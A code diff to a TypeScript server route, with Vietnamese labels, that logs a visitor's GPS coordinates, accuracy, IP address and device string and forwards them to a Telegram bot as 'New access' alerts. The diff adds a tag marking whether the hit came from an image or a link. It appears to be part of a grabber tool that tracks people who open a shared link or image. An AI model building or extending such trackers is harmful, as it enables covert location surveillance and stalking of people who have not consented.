@@ -55,23 +55,24 @@ async function sendTelegramNotification(message: string) {
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { lat, lon, acc, ip } = body;
+    const { lat, lon, acc, ip, from } = body;
 
     const headersList = headers();
     const ua = headersList.get('user-agent') ?? 'unknown';
     
-    // Prioritize IP from client, fallback to headers
     const clientIp = ip || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
     
-    // Clean up IPv6 mapped IPv4 addresses e.g. ::ffff:123.45.67.89
     const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
 
     const timestamp = new Date().toISOString();
+    const sourceText = from === 'image' ? 'Ảnh' : 'Link';
+    
     let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
+    logData += `Nguồn: ${from || 'link'}\n`;
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
 
-    let telegramMessage = `*🔔 Truy cập mới!*\n\n`;
+    let telegramMessage = `*🔔 Truy cập mới (${sourceText})!*\n\n`;
     telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN')}\`\n`;
     telegramMessage += `*Thiết bị:* \`${ua}\`\n`;
     telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
